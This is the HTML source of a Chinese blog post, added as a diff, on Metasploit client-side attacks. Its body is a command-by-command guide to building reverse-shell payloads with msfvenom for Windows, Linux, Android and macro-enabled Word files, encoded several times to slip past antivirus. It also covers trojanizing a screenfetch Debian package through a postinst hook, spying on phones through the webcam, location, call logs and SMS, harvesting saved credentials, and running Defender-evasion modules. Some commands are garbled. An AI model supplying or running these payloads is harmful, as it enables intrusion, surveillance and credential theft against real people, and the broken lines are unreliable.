@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>Metasploit客戶端攻擊 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,Metasploit," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>Metasploit客戶端攻擊</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-05-20
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="15Metasploit客戶端攻擊"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="Metasploit客戶端攻擊"><a href="#Metasploit客戶端攻擊" class="headerlink" title="Metasploit客戶端攻擊"></a>Metasploit客戶端攻擊</h2><p>在什么情况下需要使用客户端攻击：</p>
+<ol>
+<li>在无法突破网络边界的情况下转而攻击客户端；</li>
+<li>社会工程学攻击；</li>
+<li>进而渗透线上业务网络；</li>
+<li>含有漏洞利用代码的 web 站点；</li>
+<li>利用客户端漏洞；</li>
+<li>含有漏洞利用代码的 DOC,PDF 等文档；</li>
+<li>诱骗被害者执行 Payload；</li>
+</ol>
+<p>主要使用 msfvenom</p>
+<p>-p, –payload <payload> 指定payload，如使用自定義payload，要使用&amp; #039;-&amp; #039;或者 stdin 指定<br>-l, –list [module_type] 列出指定模塊的所有可用資源，類型包括 payloads, encoders, nops, all<br>-n, –-nopsled <length> 为 payload 预先指定一个 NOP 滑动长度<br>-f, –-format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取 msf 支持的输出格式列表)<br>-e, –-encoder [encoder] 指定需要使用的 encoder（编码器）<br>-a, –-arch &lt; architecture&gt; 指定 payload 的目标架构<br>–-platform， &lt; platform&gt; 指定 payload 的目标平台<br>-s, –-space &lt; length&gt; 设定有效攻击荷载的最大长度<br>-b, –-bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;\x00\xff&amp; #039;<br>-i, –-iterations &lt; count&gt; 指定 payload 的编码次数<br>-c, –-add-code &lt; path&gt; 指定一个附加的 win32 shellcode 文件<br>-x, –-template &lt; path&gt; 指定一个自定义的可执行文件作为模板<br>-k, –-keep 保护模板程序的动作，注入的 payload 作为一个新的进程运行<br>–-payload-options 列举 payload 的标准选项<br>-o, -–out &lt; path&gt; 保存 payload<br>-v, -–var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式<br>-–shellest 最小化生成 payload<br>-h, -–help 查看帮助选项<br>–-help-formats 查看 msf 支持的输出格式列表</p>
+<p>reverse_tcp 反向连接<br>msfvenom -l encodes 查看编码器列表<br>x86/shikata_ga_nai 每次解码格式不同</p>
+<h3 id="一、-Windows"><a href="#一、-Windows" class="headerlink" title="一、 Windows"></a>一、 Windows</h3><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.230 lport=4444 -b “\x00\x0ff” -a x86 –platform windows -e x86/shikata_ga_nai -i 5 -f exe -o /var/www/html/win.exe</p>
+<p>-p：指定需要使用的 payload；<br>LHOST：攻击机 IP 地址；<br>LPORT：攻击机端口；<br>-b：规避坏字符，比如: &amp; #039;\x00\xff&amp; #039; -a: 指定 payload 的目标架构; –platform：指定 payload 的目标平台；<br>-e：指定编码器模块<br>-i：指定 payload 的编码次数。编码次数越多，尽可能的绕过 AV 厂家；<br>-f：指定输出格式<br>-o 指定文件名称和导出位置</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.230 lport=4444 -b “\x00\x0ff” -a x86 –platform windows -e x86/shikata_ga_nai -i 5 -f exe -o /var/www/html/win.exe</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp lhost=34.146.243.221 lport=4444 -b “\x00\x0ff” -a x86 –platform windows -e x86/shikata_ga_nai -i 5 -f exe -o /var/www/html/win.exe</p>
+<p>监听模块</p>
+<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 4444<br>exploit</p>
+<h3 id="二、-Linux"><a href="#二、-Linux" class="headerlink" title="二、 Linux"></a>二、 Linux</h3><p>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.1.230 lport=4444 -b “\x00\x0ff” -a x64 –platform linux -i 5 -f elf -o /var/www/html/linux</p>
+<p>-p：指定需要使用的 payload；<br>LHOST：攻击机 IP 地址；<br>LPORT：攻击机端口；<br>-b：规避坏字符，比如: &amp; #039;\x00\xff&amp; #039; -a: 指定 payload 的目标架构; –platform：指定 payload 的目标平台；<br>-i：指定 payload 的编码次数。编码次数越多，尽可能的绕过 AV 厂家；<br>-f：指定输出格式，elf：linux 系统的可执行文件类型<br>-o 指定文件名称和导出位置。 #/var/www/html 網站根目錄</p>
+<p>use exploit/multi/handler<br>set payload linux/x64/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 4444<br>run</p>
+<p>–download-only 方式下载软件包不进行安装<br>apt –download-only install screenfetc</p>
+<p>将软件包移动到 root 目录 root<br>mv /var/cache/apt/archives/ screenfetch debian_amd64.deb<br>dpkg -x screenfetch debian_amd64.deb free</p>
+<p>生成恶意代码到软件包源文件中<br>msfvenom -a x64 –platform linux -p linux/x64/shell/reverse_tcp LHOST=34.81.230.75 LPORT=4444 -b “\ x00” -i 10 -f elf -o /root/screenfetch</p>
+<p>mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN<br>tee /root/free/DEBIAN/control &lt;&lt; ‘EOF’<br>tee /root/free/DEBIAN/postinst &lt;&lt; ‘EOF’<br>sudo chmod 2755 /usr / screenfetch<br>#!/bin/bash<br>sudo chmod 2755 /usr / screenfetch<br>sudo /usr/ screenfetch &amp;<br>EOF</p>
+<p>chmod 755 /root/free/DEBIAN/postinst<br>dpkg -deb –build /root/free/<br>dpkg -i free.deb</p>
+<p>#! /bin/bash<br>/use/bin/bs –color=auto<br>/home/linux &amp; /dev/null<br>chmod +a /usr/bin/bs</p>
+<h3 id="三、-手機"><a href="#三、-手機" class="headerlink" title="三、 手機"></a>三、 手機</h3><p>msfvenom –platform android -p android/meterpreter/reverse_tcp lhost=192.168.1.230 lport=4444 R&gt; /var/www/html/app.apk</p>
+<p>–platform 指定平台<br>-p 指定 payload 类型<br>LHOST 目标主机执行程序后连接我们 Kali 的地址<br>LPORT 目标主机执行程序后连接我们 Kali 的端口</p>
+<p>webcam_list<br>webcam_stream -i 2</p>
+<p>geolocate #定位<br>wlan_geolocate #wifi 定位</p>
+<p>dump_calllog #获取通话记录</p>
+<p>send_sms #发送短信<br>send_sms -d 13011112222 -t hello</p>
+<p>use exploit/multi/handler<br>set payload android/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 4444<br>run</p>
+<h3 id="四、-word文檔"><a href="#四、-word文檔" class="headerlink" title="四、 word文檔"></a>四、 word文檔</h3><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4444 -a x86 –platform windows -e x86/shikata_ga_nai -i 5 -f vba-exe</p>
+<p>第一段是宏代码<br>第二段是 payload 数据</p>
+<p>word-设置宏名，然后选择位置，再然后点击创建<br>把第一段宏代码复制到编辑器里面-保存</p>
+<p>再把第二段 payload 数据复制到 word 里面，然后另存为桌面，類型為启用宏的word文檔</p>
+<h3 id="五、-post後滲透測試"><a href="#五、-post後滲透測試" class="headerlink" title="五、 post後滲透測試"></a>五、 post後滲透測試</h3><p>扫描该网络里面的存活主机<br>run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24</p>
+<p>查看目标主机是不是虚拟机，该版本虚拟机有没有漏洞<br>run post/windows/gather/checkvm</p>
+<p>查看都有什么用户及密码，token信息<br>run post/windows/gather/credentials/credential_collector</p>
+<p>自动侦察目标机有哪些本地提权漏洞<br>run post/multi/recon/local_exploit_suggester</p>
+<p>环境变量信息<br>run post/multi/gather/env</p>
+<p>当前机器登录的用户是哪个<br>run post/windows/gather/enum_logged_on_users</p>
+<p>刪除用戶<br>run post/windows/manage/delete_user USERNAME=test</p>
+<p>把 ssh 的登录的身份认证信息列出来<br>run post/multi/gather/ssh_creds</p>
+<p>查看安装的应用程序<br>run post/windows/gather/enum_applications</p>
+<p>查看目标机上 firefox 浏览去保存的用户名及密码信息<br>run post/multi/gather/firefox_creds</p>
+<p>要是开启了 snmp 服务了，就可以查看<br>run post/windows/gather/enum_snmp</p>
+<p>检查目标机上的执行文件是不是木马程序，该模块会把这个执行程序提交到杀毒引擎上面检测<br>run post/multi/gather/check_malware REMOTEFILE=c:\a.exe </p>
+<h3 id="生成evasion-hta"><a href="#生成evasion-hta" class="headerlink" title="生成evasion hta"></a>生成evasion hta</h3><p>use windows/windows_defender_exe<br>show options<br>set filename 1.exe<br>run </p>
+<p>生成exe文件</p>
+<p>use windows/windows_defender_hs_hta<br>show options<br>set filename 1.hta<br>run </p>
+<p>生成exe文件</p>
+<h3 id="查杀引擎"><a href="#查杀引擎" class="headerlink" title="查杀引擎"></a>查杀引擎</h3><p><a target="_blank" rel="noopener" href="http://www.virustotal.com/">www.virustotal.com</a><br><a target="_blank" rel="noopener" href="http://www.virscan.org/">www.virscan.org</a></p>
+<p>nodistribute.com</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/15Metasploit%E5%AE%A2%E6%88%B6%E7%AB%AF%E6%94%BB%E6%93%8A/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/Metasploit/">
+              #Metasploit
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">Metasploit信息搜集</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/16SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A4%8E/" target="_self">SQL注入基礎</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
